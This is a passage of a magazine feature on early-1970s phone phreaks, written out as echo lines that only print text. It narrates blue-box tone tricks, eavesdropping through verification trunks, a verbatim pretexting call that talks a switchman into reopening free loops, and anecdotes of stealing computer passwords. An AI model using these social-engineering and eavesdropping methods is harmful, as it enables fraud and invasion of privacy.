echo Now I'm going to show you what it's like to stack up. Blow off. Land in a far away place. To stack that tandem up, whip back and forth across 
echo the country a few times, then shoot on up to Moscow.
echo "Listen," Captain Crunch continues. "Listen. I've got line tie on my switchboard here, and I'm gonna let you hear me stack and unstack tandems. 
echo Listen to this. It's gonna blow your mind."
echo First I hear a super rapid-fire pulsing of the flutelike phone tones, then a pause, then another popping burst of tones, then another, then 
echo another. Each burst is followed by a beep-kachink sound.
echo "We have now stacked up four tandems," said Captain Crunch, sounding somewhat remote. "That's four tandems stacked up. Do you know 
echo what that means? That means I'm whipping back and forth, back and forth twice, across the country, before coming to you. I've been known to 
echo stack up twenty tandems at a time. Now, just like I said, I'm going to shoot up to Moscow."
echo There is a new, longer series of beeper pulses over the line, a brief silence, then a ring.
echo "Hello," answers a far-off voice.
echo "Hello. Is this the American Embassy Moscow?"
echo "Yes, sir. Who is this calling?" says the voice.
echo "Yes. This is test board here in New York. We're calling to check out the circuits, see what kind of lines you've got. Everything okay there in 
echo Moscow?"
echo "Okay?"
echo "Well, yes, how are things there?"
echo "Oh. Well, everything okay, I guess."
echo "Okay. Thank you."
echo They hang up, leaving a confused series of beep-kachink sounds hanging in mid-ether in the wake of the call before dissolving away.
echo The Captain is pleased. "You believe me now, don't you? Do you know what I'd like to do? I'd just like to call up your editor at Esquire and show 
echo him just what it sounds like to stack and unstack tandems. I'll give him a show that will blow his mind. What's his number?
echo I ask the Captain what kind of device he was using to accomplish all his feats. The Captain is pleased at the question.
echo "You could tell it was special, couldn't you?" Ten pulses per second. That's faster than the phone company's equipment. Believe me, this unit 
echo is the most famous unit in the country. There is no other unit like it. Believe me."
echo "Yes, I've heard about it. Some other phone phreaks have told me about it."
echo "They have been referring to my, ahem, unit? What is it they said? Just out of curiosity, did they tell you it was a highly sophisticated 
echo computer-operated unit, with acoustical coupling for receiving outputs and a switch-board with multiple-line-tie capability? Did they tell you that 
echo the frequency tolerance is guaranteed to be not more than .05 percent? The amplitude tolerance less than .01 decibel? Those pulses you 
echo heard were perfect. They just come faster than the phone company. Those were high-precision op-amps. Op-amps are instrumentation 
echo amplifiers designed for ultra-stable amplification, super-low distortion and accurate frequency response. Did they tell you it can operate in 
echo temperatures from -55øC to +125øC?"
echo I admit that they did not tell me all that.
echo "I built it myself," the Captain goes on. "If you were to go out and buy the components from an industrial wholesaler it would cost you at least 
echo $1500. I once worked for a semiconductor company and all this didn't cost me a cent. Do you know what I mean? Did they tell you about how I 
echo put a call completely around the world? I'll tell you how I did it. I M-Fed Tokyo inward, who connected me to India, India connected me to 
echo Greece, Greece connected me to Pretoria, South Africa, South Africa connected me to South America, I went from South America to London, I 
echo had a London operator connect me to a New York operator, I had New York connect me to a California operator who rang the phone next to 
echo me. Needless to say I had to shout to hear myself. But the echo was far out. Fantastic. Delayed. It was delayed twenty seconds, but I could 
echo hear myself talk to myself."
echo "You mean you were speaking into the mouthpiece of one phone sending your voice around the world into your ear through a phone on the 
echo other side of your head?" I asked the Captain. I had a vision of something vaguely autoerotic going on, in a complex electronic way.
echo "That's right," said the Captain. "I've also sent my voice around the world one way, going east on one phone, and going west on the other, 
echo going through cable one way, satellite the other, coming back together at the same time, ringing the two phones simultaneously and picking 
echo them up and whipping my voice both ways around the world back to me. Wow. That was a mind blower." "You mean you sit there with both 
echo phones on your ear and talk to yourself around the world," I said incredulously.
echo "Yeah. Um hum. That's what I do. I connect the phone together and sit there and talk."
echo "What do you say? What do you say to yourself when you're connected?"
echo "Oh, you know. Hello test one two three," he says in a low -pitched voice.
echo "Hello test one two three," he replied to himself in a high-pitched voice.
echo "Hello test one two three," he repeats again, low-pitched.
echo "Hello test one two three," he replies, high-pitched.
echo "I sometimes do this: Hello Hello Hello Hello, Hello, hello," he trails off and breaks into laughter.
echo Why Captain Crunch Hardly Ever Taps Phones Anymore
echo Using internal phone-company codes, phone phreaks have learned a simple method for tapping phones. Phone-company operators have in 
echo front of them a board that holds verification jacks. It allows them to plug into conversations in case of emergency, to listen in to a line to 
echo determine if the line is busy or the circuits are busy. Phone phreaks have learned to beep out the codes which lead them to a verification 
echo operator, tell the verification operator they are switchmen from some other area code testing out verification trunks. Once the operator hooks 
echo them into the verification trunk, they disappear into the board for all practical purposes, slip unnoticed into any one of the 10,000 to 100,000 
echo numbers in that central office without the verification operator knowing what they're doing, and of course without the two parties to the 
echo connection knowing there is a phantom listener present on their line.
echo Toward the end of my hour-long first conversation with him, I asked the Captain if he ever tapped phones.
echo "Oh no. I don't do that. I don't think it's right," he told me firmly. "I have the power to do it but I don't... Well one time, just one time, I have to admit 
echo that I did. There was this girl, Linda, and I wanted to find out... you know. I tried to call her up for a date. I had a date with her the last weekend 
echo and I thought she liked me. I called her up, man, and her line was busy, and I kept calling and it was still busy. Well, I had just learned about this 
echo system of jumping into lines and I said to myself, 'Hmmm. Why not just see if it works. It'll surprise her if all of a sudden I should pop up on her 
echo line. It'll impress her, if anything.' So I went ahead and did it. I M-Fed into the line. My M-F-er is powerful enough when patched directly into the 
echo mouthpiece to trigger a verification trunk without using an operator the way the other phone phreaks have to.
echo "I slipped into the line and there she was talking to another boyfriend. Making sweet talk to him. I didn't make a sound because I was so 
echo disgusted. So I waited there for her to hang up, listening to her making sweet talk to the other guy. You know. So as soon as she hung up I 
echo instantly M-F-ed her up and all I said was, 'Linda, we're through.' And I hung up. And it blew her head off. She couldn't figure out what the hell 
echo happened.
echo "But that was the only time. I did it thinking I would surprise her, impress her. Those were all my intentions were, and well, it really kind of hurt 
echo me pretty badly, and... and ever since then I don't go into verification trunks."
echo Moments later my first conversation with the Captain comes to a close.
echo "Listen," he says, his spirits somewhat cheered, "listen. What you are going to hear when I hang up is the sound of tandems unstacking. Layer 
echo after layer of tandems unstacking until there's nothing left of the stack, until it melts away into nothing. Cheep, cheep, cheep, cheep," he 
echo concludes, his voice descending to a whisper with each cheep.
echo He hangs up. The phone suddenly goes into four spasms: kachink cheep. Kachink cheep kachink cheep kachink cheep, and the complex 
echo connection has wiped itself out like the Cheshire cat's smile.
echo The MF Boogie Blues
echo The next number I choose from the select list of phone-phreak alumni, prepared for me by the blue-box inventor, is a Memphis number. It is the 
echo number of Joe Engressia, the first and still perhaps the most accomplished blind phone phreak.
echo Three years ago Engressia was a nine-day wonder in newspapers and magazines all over America because he had been discovered 
echo whistling free long-distance connections for fellow students at the University of South Florida.
echo Engressia was born with perfect pitch: he could whistle phone tones better than the phone-company's equipment.
echo Engressia might have gone on whistling in the dark for a few friends for the rest of his life if the phone company hadn't decided to expose him. 
echo He was warned, disciplined by the college, and the whole case became public. In the months following media reports of his talent, Engressia 
echo began receiving strange calls. There were calls from a group of kids in Los Angeles who could do some very strange things with the quirky 
echo General Telephone and Electronics circuitry in LA suburbs. There were calls from a group of mostly blind kids in ----, California, who had been 
echo doing some interesting experiments with Cap'n Crunch whistles and test loops. There was a group in Seattle, a group in Cambridge, 
echo Massachusetts, a few from New York, a few scattered across the country. Some of them had already equipped themselves with cassette 
echo and electronic M-F devices. For some of these groups, it was the first time they knew of the others.
echo The exposure of Engressia was the catalyst that linked the separate phone-phreak centers together. They all called Engressia. They talked to 
echo him about what he was doing and what they were doing. And then he told them -- the scattered regional centers and lonely independent 
echo phone phreakers -- about each other, gave them each other's numbers to call, and within a year the scattered phone-phreak centers had 
echo grown into a nationwide underground.
echo Joe Engressia is only twenty-two years old now, but along the phone-phreak network he is "the old man," accorded by phone phreaks 
echo something of the reverence the phone company bestows on Alexander Graham Bell. He seldom needs to make calls anymore. The phone 
echo phreaks all call him and let him know what new tricks, new codes, new techniques they have learned. Every night he sits like a sightless 
echo spider in his little apartment receiving messages from every tendril of his web. It is almost a point of pride with Joe that they call him.
echo But when I reached him in his Memphis apartment that night, Joe Engressia was lonely, jumpy and upset.
echo "God, I'm glad somebody called. I don't know why tonight of all nights I don't get any calls. This guy around here got drunk again tonight and 
echo propositioned me again. I keep telling him we'll never see eye to eye on this subject, if you know what I mean. I try to make light of it, you know, 
echo but he doesn't get it. I can head him out there getting drunker and I don't know what he'll do next. It's just that I'm really all alone here, just moved 
echo to Memphis, it's the first time I'm living on my own, and I'd hate for it to all collapse now. But I won't go to bed with him. I'm just not very 
echo interested in sex and even if I can't see him I know he's ugly.
echo "Did you hear that? That's him banging a bottle against the wall outside. He's nice. Well forget about it. You're doing a story on phone phreaks? 
echo Listen to this. It's the MF Boogie Blues.
echo Sure enough, a jumpy version of Muskrat Ramble boogies its way over the line, each note one of those long-distance phone tones. The music 
echo stops. A huge roaring voice blasts the phone off my ear: "AND THE QUESTION IS..." roars the voice, "CAN A BLIND PERSON HOOK UP AN 
echo AMPLIFIER ON HIS OWN?"
echo The roar ceases. A high-pitched operator-type voice replaces it. "This is Southern Braille Tel. and Tel. Have tone, will phone."
echo This is succeeded by a quick series of M-F tones, a swift "kachink" and a deep reassuring voice: "If you need home care, call the visitingnurses association. First National time in Honolulu is 4:32 p.m."
echo Joe back in his Joe voice again: "Are we seeing eye to eye? 'Si, si,' said the blind Mexican. Ahem. Yes. Would you like to know the weather in 
echo Tokyo?"
echo This swift manic sequence of phone-phreak vaudeville stunts and blind-boy jokes manages to keep Joe's mind off his tormentor only as long as 
echo it lasts.
echo "The reason I'm in Memphis, the reason I have to depend on that homosexual guy, is that this is the first time I've been able to live on my own 
echo and make phone trips on my own. I've been banned from all central offices around home in Florida, they knew me too well, and at the 
echo University some of my fellow scholars were always harassing me because I was on the dorm pay phone all the time and making fun of me 
echo because of my fat ass, which of course I do have, it's my physical fatness program, but I don't like to hear it every day, and if I can't phone trip 
echo and I can't phone phreak, I can't imagine what I'd do, I've been devoting three quarters of my life to it.
echo "I moved to Memphis because I wanted to be on my own as well as because it has a Number 5 crossbar switching system and some 
echo interesting little independent phone-company districts nearby and so far they don't seem to know who I am so I can go on phone tripping, and 
echo for me phone tripping is just as important as phone phreaking."
echo Phone tripping, Joe explains, begins with calling up a central-office switch room. He tells the switchman in a polite earnest voice that he's a 
echo blind college student interested in telephones, and could he perhaps have a guided tour of the switching station? Each step of the tour Joe likes 
echo to touch and feel relays, caress switching circuits, switchboards, crossbar arrangements.
echo So when Joe Engressia phone phreaks he feels his way through the circuitry of the country garden of forking paths, he feels switches shift, 
echo relays shunt, crossbars swivel, tandems engage and disengage even as he hears -- with perfect pitch -- his M-F pulses make the entire Bell 
echo system dance to his tune.
echo Just one month ago Joe took all his savings out of his bank and left home, over the emotional protests of his mother. "I ran away from home 
echo almost," he likes to say. Joe found a small apartment house on Union Avenue and began making phone trips. He'd take a bus a hundred miles 
echo south in Mississippi to see some old-fashioned Bell equipment still in use in several states, which had been puzzling. He'd take a bus three 
echo hundred miles to Charlotte, North Carolina, to look at some brand-new experimental equipment. He hired a taxi to drive him twelve miles to a 
echo suburb to tour the office of a small phone company with some interesting idiosyncrasies in its routing system. He was having the time of his 
echo life, he said, the most freedom and pleasure he had known.
echo In that month he had done very little long-distance phone phreaking from his own phone. He had begun to apply for a job with the phone 
echo company, he told me, and he wanted to stay away from anything illegal.
echo "Any kind of job will do, anything as menial as the most lowly operator. That's probably all they'd give me because I'm blind. Even though I 
echo probably know more than most switchmen. But that's okay. I want to work for Ma Bell. I don't hate Ma Bell the way Gilbertson and some phone 
echo phreaks do. I don't want to screw Ma Bell. With me it's the pleasure of pure knowledge. There's something beautiful about the system when 
echo you know it intimately the way I do. But I don't know how much they know about me here. I have a very intuitive feel for the condition of the 
echo line I'm on, and I think they're monitoring me off and on lately, but I haven't been doing much illegal. I have to make a few calls to switchmen 
echo once in a while which aren't strictly legal, and once I took an acid trip and was having these auditory hallucinations as if I were trapped and 
echo these planes were dive-bombing me, and all of sudden I had to phone phreak out of there. For some reason I had to call Kansas City, but that's 
echo all."
echo A Warning Is Delivered
echo At this point -- one o'clock in my time zone -- a loud knock on my motel-room door interrupts our conversation. Outside the door I find a 
echo uniformed security guard who informs me that there has been an "emergency phone call" for me while I have been on the line and that the 
echo front desk has sent him up to let me know.
echo Two seconds after I say good-bye to Joe and hang up, the phone rings.
echo "Who were you talking to?" the agitated voice demands. The voice belongs to Captain Crunch. "I called because I decided to warn you of 
echo something. I decided to warn you to be careful. I don't want this information you get to get to the radical underground. I don't want it to get into 
echo the wrong hands. What would you say if I told you it's possible for three phone phreaks to saturate the phone system of the nation. Saturate it. 
echo Busy it out. All of it. I know how to do this. I'm not gonna tell. A friend of mine has already saturated the trunks between Seattle and New York. 
echo He did it with a computerized M-F-er hitched into a special Manitoba exchange. But there are other, easier ways to do it."
echo Just three people? I ask. How is that possible?
echo "Have you ever heard of the long-lines guard frequency? Do you know about stacking tandems with 17 and 2600? Well, I'd advise you to find 
echo out about it. I'm not gonna tell you. But whatever you do, don't let this get into the hands of the radical underground."
echo (Later Gilbertson, the inventor, confessed that while he had always been skeptical about the Captain's claim of the sabotage potential of trunktying phone phreaks, he had recently heard certain demonstrations which convinced him the Captain was not speaking idly. "I think it might take 
echo more than three people, depending on how many machines like Captain Crunch's were available. But even though the Captain sounds a little 
echo weird, he generally turns out to know what he's talking about.")
echo "You know," Captain Crunch continues in his admonitory tone, "you know the younger phone phreaks call Moscow all the time. Suppose 
echo everybody were to call Moscow. I'm no right-winger. But I value my life. I don't want the Commies coming over and dropping a bomb on my 
echo head. That's why I say you've got to be careful about who gets this information."
echo The Captain suddenly shifts into a diatribe against those phone phreaks who don't like the phone company.
echo "They don't understand, but Ma Bell knows everything they do. Ma Bell knows. Listen, is this line hot? I just heard someone tap in. I'm not 
echo paranoid, but I can detect things like that. Well, even if it is, they know that I know that they know that I have a bulk eraser. I'm very clean." The 
echo Captain pauses, evidently torn between wanting to prove to the phone-company monitors that he does nothing illegal, and the desire to impress 
echo Ma Bell with his prowess. "Ma Bell knows how good I am. And I am quite good. I can detect reversals, tandem switching, everything that goes 
echo on a line. I have relative pitch now. Do you know what that means? My ears are a $20,000 piece of equipment. With my ears I can detect things 
echo they can't hear with their equipment. I've had employment problems. I've lost jobs. But I want to show Ma Bell how good I am. I don't want to 
echo screw her, I want to work for her. I want to do good for her. I want to help her get rid of her flaws and become perfect. That's my number-one 
echo goal in life now." The Captain concludes his warnings and tells me he has to be going. "I've got a little action lined up for tonight," he explains 
echo and hangs up.
echo Before I hang up for the night, I call Joe Engressia back. He reports that his tormentor has finally gone to sleep -- "He's not blind drunk, that's 
echo the way I get, ahem, yes; but you might say he's in a drunken stupor." I make a date to visit Joe in Memphis in two days.
echo A Phone Phreak Call Takes Care of Business
echo The next morning I attend a gathering of four phone phreaks in ----- (a California suburb). The gathering takes place in a comfortable split-level 
echo home in an upper-middle-class subdivision. Heaped on the kitchen table are the portable cassette recorders, M-F cassettes, phone patches, 
echo and line ties of the four phone phreaks present. On the kitchen counter next to the telephone is a shoe-box-size blue box with thirteen large 
echo toggle switches for the tones. The parents of the host phone phreak, Ralph, who is blind, stay in the living room with their sighted children. 
echo They are not sure exactly what Ralph and his friends do with the phone or if it's strictly legal, but he is blind and they are pleased he has a 
echo hobby which keeps him busy.
echo The group has been working at reestablishing the historic "2111" conference, reopening some toll-free loops, and trying to discover the 
echo dimensions of what seem to be new initiatives against phone phreaks by phone-company security agents.
echo It is not long before I get a chance to see, to hear, Randy at work. Randy is known among the phone phreaks as perhaps the finest con man in 
echo the game. Randy is blind. He is pale, soft and pear-shaped, he wears baggy pants and a wrinkly nylon white sport shirt, pushes his head 
echo forward from hunched shoulders somewhat like a turtle inching out of its shell. His eyes wander, crossing and recrossing, and his forehead is 
echo somewhat pimply. He is only sixteen years old.
echo But when Randy starts speaking into a telephone mouthpiece his voice becomes so stunningly authoritative it is necessary to look again to 
echo convince yourself it comes from a chubby adolescent Randy. Imagine the voice of a crack oil-rig foreman, a tough, sharp, weather-beaten 
echo Marlboro man of forty. Imagine the voice of a brilliant performance-fund gunslinger explaining how he beats the Dow Jones by thirty percent. 
echo Then imagine a voice that could make those two sound like Stepin Fetchit. That is sixteen-year-old Randy's voice.
echo He is speaking to a switchman in Detroit. The phone company in Detroit had closed up two toll-free loop pairs for no apparent reason, although 
echo heavy use by phone phreaks all over the country may have been detected. Randy is telling the switchman how to open up the loop and make it 
echo free again:
echo "How are you, buddy. Yeah. I'm on the board in here in Tulsa, Oklahoma, and we've been trying to run some tests on your loop-arounds and 
echo we find'em busied out on both sides.... Yeah, we've been getting a 'BY' on them, what d'ya say, can you drop cards on 'em? Do you have 08 
echo on your number group? Oh that's okay, we've had this trouble before, we may have to go after the circuit. Here lemme give 'em to you: your 
echo frame is 05, vertical group 03, horizontal 5, vertical file 3. Yeah, we'll hang on here.... Okay, found it? Good. Right, yeah, we'd like to clear that 
echo busy out. Right. All you have to do is look for your key on the mounting plate, it's in your miscellaneous trunk frame. Okay? Right. Now pull your 
echo key from NOR over the LCT. Yeah. I don't know why that happened, but we've been having trouble with that one. Okay. Thanks a lot fella. Be 
echo seein' ya."
echo Randy hangs up, reports that the switchman was a little inexperienced with the loop-around circuits on the miscellaneous trunk frame, but that 
echo the loop has been returned to its free-call status.
echo Delighted, phone phreak Ed returns the pair of numbers to the active-status column in his directory. Ed is a superb and painstaking researcher. 
echo With almost Talmudic thoroughness he will trace tendrils of hints through soft-wired mazes of intervening phone-company circuitry back 
echo through complex linkages of switching relays to find the location and identity of just one toll-free loop. He spends hours and hours, every day, 
echo doing this sort of thing. He has somehow compiled a directory of eight hundred "Band-six in-WATS numbers" located in over forty states. 
echo Band-six in-WATS numbers are the big 800 numbers -- the ones that can be dialed into free from anywhere in the country.
echo Ed the researcher, a nineteen-year-old engineering student, is also a superb technician. He put together his own working blue box from 
echo scratch at age seventeen. (He is sighted.) This evening after distributing the latest issue of his in-WATS directory (which has been typed into 
echo Braille for the blind phone phreaks), he announces he has made a major new breakthrough:
echo "I finally tested it and it works, perfectly. I've got this switching matrix which converts any touch-tone phone into an M-F-er."
echo The tones you hear in touch-tone phones are not the M-F tones that operate the long-distance switching system. Phone phreaks believe ATandT. 
echo had deliberately equipped touch tones with a different set of frequencies to avoid putting the six master M-F tones in the hands of every touchtone owner. Ed's complex switching matrix puts the six master tones, in effect put a blue box, in the hands of every touch-tone owner.
echo Ed shows me pages of schematics, specifications and parts lists. "It's not easy to build, but everything here is in the Heathkit catalog."
echo Ed asks Ralph what progress he has made in his attempts to reestablish a long-term open conference line for phone phreaks. The last big 
echo conference -- the historic "2111" conference -- had been arranged through an unused Telex test-board trunk somewhere in the innards of a 
echo 4A switching machine in Vancouver, Canada. For months phone phreaks could M-F their way into Vancouver, beep out 604 (the Vancouver 
echo area code) and then beep out 2111 (the internal phone-company code for Telex testing), and find themselves at any time, day or night, on an 
echo open wire talking with an array of phone phreaks from coast to coast, operators from Bermuda, Tokyo and London who are phone-phreak 
echo sympathizers, and miscellaneous guests and technical experts. The conference was a massive exchange of information. Phone phreaks 
echo picked each other's brains clean, then developed new ways to pick the phone company's brains clean. Ralph gave M F Boogies concerts with 
echo his home-entertainment-type electric organ, Captain Crunch demonstrated his round-the-w orld prowess with his notorious computerized unit 
echo and dropped leering hints of the "action" he was getting with his girl friends. (The Captain lives out or pretends to live out several kinds of 
echo fantasies to the gossipy delight of the blind phone phreaks who urge him on to further triumphs on behalf of all of them.) The somewhat rowdy 
echo Northwest phone-phreak crowd let their bitter internal feud spill over into the peaceable conference line, escalating shortly into guerrilla 
echo warfare; Carl the East Coast international tone relations expert demonstrated newly opened direct M-F routes to central offices on the island of 
echo Bahrein in the Persian Gulf, introduced a new phone-phreak friend of his in Pretoria, and explained the technical operation of the new Oaklandto Vietnam linkages. (Many phone phreaks pick up spending money by M-F-ing calls from relatives to Vietnam GIs charging $5 for a whole hour 
echo of trans-Pacific conversation.)
echo Day and night the conference line was never dead. Blind phone phreaks all over the country, lonely and isolated in homes filled with active 
echo sighted brothers and sisters, or trapped with slow and unimaginative blind kids in straitjacket schools for the blind, knew that no matter how 
echo late it got they could dial up the conference and find instant electronic communion with two or three other blind kids awake over on the other 
echo side of America. Talking together on a phone hookup, the blind phone phreaks say, is not much different from being there together. Physically, 
echo there was nothing more than a two-inch-square wafer of titanium inside a vast machine on Vancouver Island. For the blind kids >there< meant 
echo an exhilarating feeling of being in touch, through a kind of skill and magic which was peculiarly their own.
echo Last April 1, however, the long Vancouver Conference was shut off. The phone phreaks knew it was coming. Vancouver was in the process 
echo of converting from a step-by-step system to a 4A machine and the 2111 Telex circuit was to be wiped out in the process. The phone phreaks 
echo learned the actual day on which the conference would be erased about a week ahead of time over the phone company's internal-news-andshop-talk recording.
echo For the next frantic seven days every phone phreak in America was on and off the 2111 conference twenty-four hours a day. Phone phreaks 
echo who were just learning the game or didn't have M-F capability were boosted up to the conference by more experienced phreaks so they could 
echo get a glimpse of what it was like before it disappeared. Top phone phreaks searched distant area codes for new conference possibilities 
echo without success. Finally in the early morning of April 1, the end came.
echo "I could feel it coming a couple hours before midnight," Ralph remembers. "You could feel something going on in the lines. Some static began 
echo showing up, then some whistling wheezing sound. Then there were breaks. Some people got cut off and called right back in, but after a while 
echo some people were finding they were cut off and couldn't get back in at all. It was terrible. I lost it about one a.m., but managed to slip in again 
echo and stay on until the thing died... I think it was about four in the morning. There were four of us still hanging on when the conference 
echo disappeared into nowhere for good. We all tried to M-F up to it again of course, but we got silent termination. There was nothing there."
echo The Legendary Mark Bernay Turns Out To Be "The Midnight Skulker"
echo Mark Bernay. I had come across that name before. It was on Gilbertson's select list of phone phreaks. The California phone phreaks had 
echo spoken of a mysterious Mark Bernay as perhaps the first and oldest phone phreak on the West Coast. And in fact almost every phone phreak 
echo in the West can trace his origins either directly to Mark Bernay or to a disciple of Mark Bernay.
echo It seems that five years ago this Mark Bernay (a pseudonym he chose for himself) began traveling up and down the West Coast pasting tiny 
echo stickers in phone books all along his way. The stickers read something like "Want to hear an interesting tape recording? Call these numbers." 
echo The numbers that followed were toll-free loop-around pairs. When one of the curious called one of the numbers he would hear a tape 
echo recording pre-hooked into the loop by Bernay which explained the use of loop-around pairs, gave the numbers of several more, and ended by 
echo telling the caller, "At six o'clock tonight this recording will stop and you and your friends can try it out. Have fun."
echo "I was disappointed by the response at first," Bernay told me, when I finally reached him at one of his many numbers and he had dispensed 
echo with the usual "I never do anything illegal" formalities which experienced phone phreaks open most conversations.
echo "I went all over the coast with these stickers not only on pay phones, but I'd throw them in front of high schools in the middle of the night, I'd 
echo leave them unobtrusively in candy stores, scatter them on main streets of small towns. At first hardly anyone bothered to try it out. I would 
echo listen in for hours and hours after six o'clock and no one came on. I couldn't figure out why people wouldn't be interested. Finally these two 
echo girls in Oregon tried it out and told all their friends and suddenly it began to spread."
echo Before his Johny Appleseed trip Bernay had already gathered a sizable group of early pre-blue-box phone phreaks together on loop-arounds 
echo in Los Angeles. Bernay does not claim credit for the original discovery of the loop-around numbers. He attributes the discovery to an eighteenyear-old reform school kid in Long Beach whose name he forgets and who, he says, "just disappeared one day." When Bernay himself 
echo discovered loop-arounds independently, from clues in his readings in old issues of the Automatic Electric Technical Journal, he found dozens 
echo of the reform-school kid's friends already using them. However, it was one of Bernay's disciples in Seattle that introduced phone phreaking to 
echo blind kids. The Seattle kid who learned about loops through Bernay's recording told a blind friend, the blind kid taught the secret to his friends at 
echo a winter camp for blind kids in Los Angeles. When the camp session was over these kids took the secret back to towns all over the West. This 
echo is how the original blind kids became phone phreaks. For them, for most phone phreaks in general, it was the discovery of the possibilities of 
echo loop-arounds which led them on to far more serious and sophisticated phone-phreak methods, and which gave them a medium for sharing their 
echo discoveries.
echo A year later a blind kid who moved back east brought the technique to a blind kids' summer camp in Vermont, which spread it along the East 
echo Coast. All from a Mark Bernay sticker.
echo Bernay, who is nearly thirty years old now, got his start when he was fifteen and his family moved into an L.A. suburb serviced by General 
echo Telephone and Electronics equipment. He became fascinated with the differences between Bell and G.T.andE. equipment. He learned he could 
echo make interesting things happen by carefully timed clicks with the disengage button. He learned to interpret subtle differences in the array of 
echo clicks, whirrs and kachinks he could hear on his lines. He learned he could shift himself around the switching relays of the L.A. area code in a 
echo not-too-predictable fashion by interspersing his own hook-switch clicks with the clicks within the line. (Independent phone companies -- there 
echo are nineteen hundred of them still left, most of them tiny island principalities in Ma Bell's vast empire -- have always been favorites with phone 
echo phreaks, first as learning tools, then as Archimedes platforms from which to manipulate the huge Bell system. A phone phreak in Bell territory 
echo will often M-F himself into an independent's switching system, with switching idiosyncrasies which can give him marvelous leverage over the 
echo Bell System.
echo "I have a real affection for Automatic Electric Equipment," Bernay told me. "There are a lot of things you can play with. Things break down in 
echo interesting ways."
echo Shortly after Bernay graduated from college (with a double major in chemistry and philosophy), he graduated from phreaking around with 
echo G.T.andE. to the Bell System itself, and made his legendary sticker-pasting journey north along the coast, settling finally in Northwest Pacific Bell 
echo territory. He discovered that if Bell does not break down as interestingly as G.T.andE., it nevertheless offers a lot of "things to play with."
echo Bernay learned to play with blue boxes. He established his own personal switchboard and phone-phreak research laboratory complex. He 
echo continued his phone-phreak evangelism with ongoing sticker campaigns. He set up two recording numbers, one with instructions for beginning 
echo phone phreaks, the other with latest news and technical developments (along with some advanced instruction) gathered from sources all over 
echo the country.
echo These days, Bernay told me, he had gone beyond phone-phreaking itself. "Lately I've been enjoying playing with computers more than playing 
echo with phones. My personal thing in computers is just like with phones, I guess -- the kick is in finding out how to beat the system, how to get at 
echo things I'm not supposed to know about, how to do things with the system that I'm not supposed to be able to do."
echo As a matter of fact, Bernay told me, he had just been fired from his computer-programming job for doing things he was not supposed to be able 
echo to do. He had been working with a huge time-sharing computer owned by a large corporation but shared by many others. Access to the 
echo computer was limited to those programmers and corporations that had been assigned certain passwords. And each password restricted its 
echo user to access to only the one section of the computer cordoned off from its own information storager. The password system prevented 
echo companies and individuals from stealing each other's information.
echo "I figured out how to write a program that would let me read everyone else's password," Bernay reports. "I began playing around with 
echo passwords. I began letting the people who used the computer know, in subtle ways, that I knew their passwords. I began dropping notes to 
echo the computer supervisors with hints that I knew what I know. I signed them 'The Midnight Skulker.' I kept getting cleverer and cleverer with my 
echo messages and devising ways of showing them what I could do. I'm sure they couldn't imagine I could do the things I was showing them. But 
echo they never responded to me. Every once in a while they'd change the passwords, but I found out how to discover what the new ones were, 
echo and I let them know. But they never responded directly to the Midnight Skulker. I even finally designed a program which they could use to 
echo prevent my program from finding out what it did. In effect I told them how to wipe me out, The Midnight Skulker. It was a very clever program. I 
echo started leaving clues about myself. I wanted them to try and use it and then try to come up with something to get around that and reappear 
echo again. But they wouldn't play. I wanted to get caught. I mean I didn't want to get caught personally, but I wanted them to notice me and admit 
echo that they noticed me. I wanted them to attempt to respond, maybe in some interesting way." Finally the computer managers became concerned 
echo enough about the threat of information-stealing to respond. However, instead of using The Midnight Skulker's own elegant self-destruct 
echo program, they called in their security personnel, interrogated everyone, found an informer to identify Bernay as The Midnight Skulker, and fired 
echo him.
echo "At first the security people advised the company to hire me full-time to search out other flaws and discover other computer freaks. I might 
echo have liked that. But I probably would have turned into a double double agent rather than the double agent they wanted. I might have resurrected 
echo The Midnight Skulker and tried to catch myself. Who knows? Anyway, the higher-ups turned the whole idea down."
echo You Can Tap the F.B.I.'s Crime Control Computer in the Comfort of Your Own Home, Perhaps.
echo Computer freaking may be the wave of the future. It suits the phone-phreak sensibility perfectly. Gilbertson, the blue-box inventor and a lifelong 
echo phone phreak, has also gone on from phone-phreaking to computer-freaking. Before he got into the blue-box business Gilbertson, who is a 
echo highly skilled programmer, devised programs for international currency arbitrage.
echo But he began playing with computers in earnest when he learned he could use his blue box in tandem with the computer terminal installed in his 
echo apartment by the instrumentation firm he worked for. The print-out terminal and keyboard was equipped with acoustical coupling, so that by 
echo coupling his little ivory Princess phone to the terminal and then coupling his blue box on that, he could M-F his way into other computers with 
echo complete anonymity, and without charge; program and re-program them at will; feed them false or misleading information; tap and steal from 
echo them. He explained to me that he taps computers by busying out all the lines, then going into a verification trunk, listening into the passwords 
echo and instructions one of the time sharers uses, and them M-F-ing in and imitating them. He believes it would not be impossible to creep into the 
echo F.B.I's crime control computer through a local police computer terminal and phreak around with the F.B.I.'s memory banks. He claims he has 
echo succeeded in re-programming a certain huge institutional computer in such a way that it has cordoned off an entire section of its circuitry for 
echo his personal use, and at the same time conceals that arrangement from anyone else's notice. I have been unable to verify this claim.
echo Like Captain Crunch, like Alexander Graham Bell (pseudonym of a disgruntled-looking East Coast engineer who claims to have invented the 
echo black box and now sells black and blue boxes to gamblers and radical heavies), like most phone phreaks, Gilbertson began his career trying to 
echo rip off pay phones as a teenager. Figure them out, then rip them off. Getting his dime back from the pay phone is the phone phreak's first 
echo thrilling rite of passage. After learning the usual eighteen different ways of getting his dime back, Gilbertson learned how to make master keys 
echo to coin-phone cash boxes, and get everyone else's dimes back. He stole some phone-company equipment and put together his own home 
echo switchboard with it. He learned to make a simple "bread-box" device, of the kind used by bookies in the Thirties (bookie gives a number to his 
echo betting clients; the phone with that number is installed in some widow lady's apartment, but is rigged to ring in the bookie's shop across town, 
echo cops trace big betting number and find nothing but the widow).
echo Not long after that afternoon in 1968 when, deep in the stacks of an engineering library, he came across a technical journal with the phone 
echo tone frequencies and rushed off to make his first blue box, not long after that Gilbertson abandoned a very promising career in physical 
echo chemistry and began selling blue boxes for $1,500 apiece.
echo "I had to leave physical chemistry. I just ran out of interesting things to learn," he told me one evening. We had been talking in the apartment of 
echo the man who served as the link between Gilbertson and the syndicate in arranging the big $300,000 blue-box deal which fell through because 
echo of legal trouble. There has been some smoking.
echo "No more interesting things to learn," he continues. "Physical chemistry turns out to be a sick subject when you take it to its highest level. I don't 
echo know. I don't think I could explain to you how it's sick. You have to be there. But you get, I don't know, a false feeling of omnipotence. I suppose 
echo it's like phone-phreaking that way. This huge thing is there. This whole system. And there are holes in it and you slip into them like Alice and 
